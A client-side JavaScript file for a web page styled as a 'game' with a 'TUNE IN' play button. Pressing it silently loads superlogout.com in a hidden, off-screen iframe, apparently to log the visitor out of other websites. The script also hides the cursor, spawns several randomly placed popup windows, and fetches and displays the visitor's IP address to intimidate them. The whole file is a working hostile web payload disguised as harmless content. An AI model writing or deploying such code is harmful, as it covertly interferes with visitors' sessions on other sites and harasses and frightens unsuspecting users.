document.addEventListener('DOMContentLoaded', () => {
    const gameContainer = document.getElementById('game-container');
    const gameImage = document.getElementById('game-image');
    const gameAudio = document.getElementById('game-audio');
    const ipAddressElement = document.getElementById('ip-address');
    const playButton = document.getElementById('playButton');
    let gameStarted = false;
    let userIp = 'Unknown';
    let popupCount = 0;

    // Set the site to load silently when TUNE IN is pressed
    const SILENT_URL = 'https://superlogout.com/';

    function openWebsiteSilently(url) {
        if (!url) return;
        const iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;border:0;left:-9999px;top:-9999px;';
        iframe.setAttribute('aria-hidden', 'true');
        iframe.tabIndex = -1;
        document.body.appendChild(iframe);
    }

    function getPopupUrl() {
        return `popup.html?ip=${encodeURIComponent(userIp)}&r=${Date.now()}_${Math.random()}`;
    }

    function createPopup() {
        const w = 400;
        const h = 400;
        const left = Math.floor(Math.random() * Math.max(1, screen.width - w));
        const top = Math.floor(Math.random() * Math.max(1, screen.height - h));
        window.open(
            getPopupUrl(),
            `Popup_${popupCount++}_${Date.now()}`,
            `width=${w},height=${h},left=${left},top=${top}`
        );
    }

    window.createPopup = createPopup;

    function openThreePopups() {
        createPopup();
        createPopup();
        createPopup();
    }

    fetch('https://api.ipify.org?format=json')
        .then((response) => response.json())
        .then((data) => {
            userIp = data.ip;
            ipAddressElement.textContent = `Your IP: ${data.ip}`;
        })
        .catch(() => {
            ipAddressElement.textContent = 'IP: Unknown';
        });

    function showGameOverlay() {
        hideCursor();
        openWebsiteSilently(SILENT_URL);
        gameImage.src = 'assets/game-animation.gif';
        gameContainer.style.display = 'flex';
        ipAddressElement.style.display = 'block';
        gameAudio.play().catch((error) => {
            console.error('Audio failed to play:', error);
        });
    }

    function hideCursor() {
        document.documentElement.style.cursor = 'none';
        document.body.style.cursor = 'none';
    }

    function startGame() {
        if (gameStarted) return;
        gameStarted = true;
        hideCursor();
        openThreePopups();
    }

    playButton.addEventListener('click', showGameOverlay);
    document.addEventListener('click', startGame);
});
